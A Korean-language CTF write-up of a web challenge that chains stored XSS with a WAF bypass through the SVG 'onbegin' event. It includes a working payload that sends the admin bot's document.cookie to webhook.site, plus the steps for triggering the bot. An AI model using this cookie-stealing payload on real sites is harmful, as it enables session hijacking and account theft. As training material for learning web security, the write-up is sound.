---
ctf_name: "BDSec CTF 2026"
challenge_name: "Ticketly"
category: "web"
difficulty: "easy"
author: "inhwan689"
date: "2026-07-21"
tags: [XSS, WAF-bypass, SVG, cookie-theft]
---

# Ticketly

## 문제 설명

> 티켓을 등록하면 운영자 봇이 모든 티켓을 직접 열어서 검토한다. 본문에는 서식이 허용되며, 모든 제출은 BDSEC Firewall이 검사한다.

- 기능: 회원가입 / 로그인 / 티켓 작성(`/tickets/new`) / 티켓 조회(`/ticket/<id>`) / 관리자에게 신고(`POST /report/<id>`)

## 풀이

### 분석

가입 후 티켓을 작성하면 본문이 `/ticket/<id>` 페이지에 그대로 렌더된다. `<b>bold</b>`를 넣어보면 실제로 굵게 출력되고, 응답 HTML을 확인하면 다음과 같이 이스케이프 없이 raw HTML로 삽입된다.

```html
<div class="ticket-body">
  <b>bold</b>
</div>
```

즉 티켓 본문은 Stored XSS가 성립한다. 그리고 티켓 조회 페이지에는 "Report this ticket to the admin" 버튼이 있고, 이는 `POST /report/<id>`로 관리자 봇을 해당 티켓 페이지로 방문시킨다.

### 취약점

- Stored XSS: 티켓 본문이 이스케이프 없이 렌더됨
- 부실한 WAF: 차단 시 어떤 시그니처에 걸렸는지 응답에 그대로 노출한다

```html
<p class="sig">Signature: <code>SCRIPT_TAG</code></p>
```

이 노출된 시그니처명을 지도 삼아, 여러 벡터를 넣어보며 블랙리스트를 매핑했다.

핵심은 블랙리스트가 고정된 이름 목록이라는 점이다. 흔한 트리거(`onload`,`onerror` 등등)는 막지만 `onbegin`은 막지 않는다. `onbegin`은 SVG 애니메이션이 시작될 때 자동으로 발화하는 이벤트라, 사용자 상호작용 없이 페이지 로드 직후 실행된다. 또한 유출에 쓸 `fetch(`와 `document.cookie`도 전부 통과한다.

### 익스플로잇

1. 데이터를 받을 리스너를 준비한다
2. 아래 페이로드를 티켓 본문으로 제출한다.

```html
<svg><animate onbegin="fetch('https://webhook.site/<MY_ID>/?c='+document.cookie)">
```

3. 저장된 티켓의 신고 버튼(`POST /report/<id>`)으로 관리자 봇을 소환한다.
4. 봇이 티켓 페이지를 열면 `onbegin`이 자동 발화하여 봇의 `document.cookie`가 webhook.site로 전송된다.
5. webhook.site에 도착한 요청의 쿼리스트링에서 관리자 쿠키(= 플래그)를 확인한다.

이 문제에서는 봇의 쿠키 자체에 플래그가 담겨 있었다.

## 플래그

```
bdsec{REDACTED}
```

## 배운 점

- 이 문제처럼 걸린 시그니처명을 응답에 노출하면, 하나하나 시도해보면서 블랙리스트 매핑에 용이하다.
- 봇 화면은 볼 수 없으므로 내가 통제하는 서버로 데이터를 흘려보내야 하고, 또한 사람이 아니므로 해야하는 활동을 다 지정해줘야한다.